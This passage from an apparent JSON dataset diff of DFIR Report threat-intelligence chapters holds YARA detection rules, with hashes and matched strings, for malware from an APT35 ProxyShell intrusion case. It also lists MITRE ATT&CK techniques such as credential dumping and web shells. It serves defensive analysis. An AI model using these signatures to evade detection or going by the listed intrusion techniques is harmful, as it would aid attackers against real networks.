$s16 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" wide /* base64 encoded string '' */\n $s17 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" wide /* base64 encoded string '' */\n $s18 = \"aSystem.Web.ApplicationServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n $s19 = \"\\\\System.EnterpriseServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n $s20 = \"SMicrosoft.CSharp, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" fullword ascii\n condition:\n uint16(0) == 0x5a4d and filesize < 2000KB and\n 1 of ($x*) and 4 of them\n}\nrule _user_task_update_0 {\n meta:\n description = \"9893_files - from files user.exe, task_update.exe\"\n author = \"TheDFIRReport\"\n eference = \"Case: 9893\"\n date = \"2022-02-27\"\n hash1 = \"7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b\"\n hash2 = \"12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a\"\n strings:\n $s1 = \"-InitOnceExecuteOnce\" fullword ascii\n $s2 = \"PB_GadgetStack_%I64i\" fullword ascii\n $s3 = \"PB_DropAccept\" fullword ascii\n $s4 = \"PB_PostEventMessage\" fullword ascii\n $s5 = \"PB_WindowID\" fullword ascii\n $s6 = \"?GetLongPathNameA\" fullword ascii\n $s7 = \"Memory page error\" fullword ascii\n $s8 = \"PPPPPPH\" fullword ascii\n $s9 = \"YZAXAYH\" fullword ascii\n $s10 = \"%d:%I64d:%I64d:%I64d\" fullword ascii\n $s11 = \"PYZAXAYH\" fullword ascii\n $s12 = \"PB_MDI_Gadget\" fullword ascii\n $s13 = \"PostEventClass\" fullword ascii\n $s14 = \"t$hYZAXAYH\" fullword ascii\n $s15 = \"$YZAXAYH\" fullword ascii\n $s16 = \"Floating-point underflow (exponent too small)\" fullword ascii\n $s17 = \"Inexact floating-point result\" fullword ascii\n $s18 = \"Single step trap\" fullword ascii\n $s19 = \"Division by zero (floating-point)\" fullword ascii\n $s20 = \"tmHcI(H\" fullword ascii\n condition:\n ( uint16(0) == 0x5a4d and filesize < 300KB and ( 8 of them )\n ) or ( all of them )\n}"
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0xa4955753",
+            "title": "MITRE",
+            "text": "Exploit Public-Facing Application T1190\nOS Credential Dumping T1003\nAccount Manipulation T1098\nValid Accounts T1078\nIngress Tool Transfer T1105\nMatch Legitimate Name or Location T1036.005\nWindows Service T1543.003\nWeb Shell T1505.003\nSystem Information Discovery T1082\nSystem Network Configuration Discovery T1016\nSystem Owner/User Discovery T1033\nWindows Command Shell T1059.003\nInternal case #9893"
+        }
+    },
+    {
+        "report": {
+            "id": "report_0xf5852dae",
+            "date": "20220321",
+            "title": "APT35 Automates Initial Access Using ProxyShell",
+            "url": "https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+        },
+        "chapter": {
+            "id": "chapter_0xbd7884be",
+            "title": "Share this:",
+            "text": "Twitter\nFacebook\nLinkedIn\nReddit"
+        }
+    }
+]
